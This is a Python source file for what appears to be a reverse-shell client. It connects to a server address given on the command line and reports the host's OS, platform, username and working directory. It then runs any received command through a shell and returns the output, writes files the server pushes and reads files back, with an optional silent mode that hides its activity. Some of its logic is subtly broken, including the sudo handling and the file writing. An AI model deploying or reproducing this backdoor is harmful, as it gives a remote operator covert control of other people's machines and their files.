import os
import socket
import base64
import platform
import subprocess
from sys import argv
from time import sleep

VERSION = '0.1.2'

NETWORK = {'--ip': '127.0.0.1',
           '--port': 8084}

silent_mode = False         # without any prints
retry_connecting = False    # retry connecting until connection with server won't be established
retries_timeout = 300       # seconds. 300 seconds is 5 minutes
retries_limit = None        # stop retrying to connect to the server after n fails


class tools:
    @staticmethod
    def recvfiles(line):
        files = line.split('|')[1:]
        answer_to_server = ''
        located = 0
        for file in files:
            filename, file_content = file.split(':')
            try:
                with open(filename, 'wb') as recvfile:
                    recvfile.write(file_content)
                located += 1
            except Exception as file_locating_error:
                answer_to_server += f'Unable to locate file {filename}: {file_locating_error}\n'
        answer_to_server += f'Located {located} files'
        return answer_to_server

    @staticmethod
    def catfile(filename):
        with open(filename, 'r') as content:
            return content.read()


def printf(*text):
    if not silent_mode:
        print(*text)


# python3 shell.py --ip <ip of your server> --port <port the server running at>
for arg in ['--ip', '--port']:
    try:
        if arg in argv:
            NETWORK[arg] = argv[argv.index(arg) + 1]
    except IndexError:
        printf('[ERROR] Arguments are not valid')


modified_cmds = {
    'chdir': os.chdir,
    'mk': lambda name: open(name, 'w').close(),
    'recvfile': tools.recvfiles,
    'recvfiles': tools.recvfiles,
    'cat': tools.catfile
}


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    sock.connect(tuple(NETWORK.values()))
except:
    printf('[ERROR] Server is unavailable')
    exit()

try:
    sock.send(base64.b64encode(', '.join([platform.system(), platform.platform(), platform.processor()]).encode('utf-8')))
except BrokenPipeError:
    printf('[ERROR] Server is unavailable')
    exit()

sleep(0.2)

username = os.path.split(os.path.expanduser('~'))[-1]

try:
    while True:
        printf('updating info for the server...')
        sock.send(base64.b64encode(f'currdiranduser|{os.getcwd()}|{username}'.encode('utf-8')))
        printf('waiting for a command...')
        cmd = base64.b64decode(sock.recv(1024)).decode('utf-8')
        printf('command received:', cmd)

        try:
            if cmd in ['dc', 'disconnect', 'quit', 'exit']:
                printf('[INFO] Server has been disconnected')
                break

            elif cmd.split('|')[0] in modified_cmds:
                cmd_split = cmd.split('|')
                cmd_name = cmd_split[0]
                cmd_args = cmd_split[1:]
                cmd_output = '<empty>'
                modified_cmds[cmd_name](*cmd_args)
            else:
                if cmd[0] == 'sudo':
                    cmd = f'echo {cmd[1]} | sudo {" ".join(cmd[2:])}'
                cmd_output = subprocess.check_output(cmd, timeout=5,
                                                     shell=True, stderr=subprocess.STDOUT).decode().strip('\n')
        except Exception as cmd_exc:
            cmd_output = str(cmd_exc)
        sleep(0.1)
        printf('sending command result:', cmd_output)
        sock.send(base64.b64encode(cmd_output.encode('utf-8')))
        sleep(0.1)

except:
    sock.send(base64.b64encode('dc'.encode('utf-8')))

sock.close()
